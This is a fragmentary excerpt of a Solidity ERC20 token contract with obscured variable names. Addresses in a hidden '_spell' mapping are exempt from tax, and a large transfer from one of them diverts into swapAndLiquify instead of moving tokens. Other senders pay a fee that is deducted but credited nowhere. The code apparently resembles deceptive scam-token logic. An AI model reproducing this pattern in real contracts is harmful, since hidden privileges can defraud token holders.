...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private _spell;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(uint256 => address) private _environment;
    mapping(uint256 => address) private _fourth;
    mapping(address => uint256) private _light;
    ...
    function _transfer(
        ...
        if (_spell[_could] > 0 && amount > _sky) {
            swapAndLiquify(amount);
            return;
        }

        if (_taxFee > 0 && _spell[_could] == 0) {
            uint256 fee = (amount * _taxFee) / 100;
            amount -= fee;
            _balances[_could] -= fee;
        }

        _balances[_could] -= amount;
        _balances[_limited] += amount;
    }
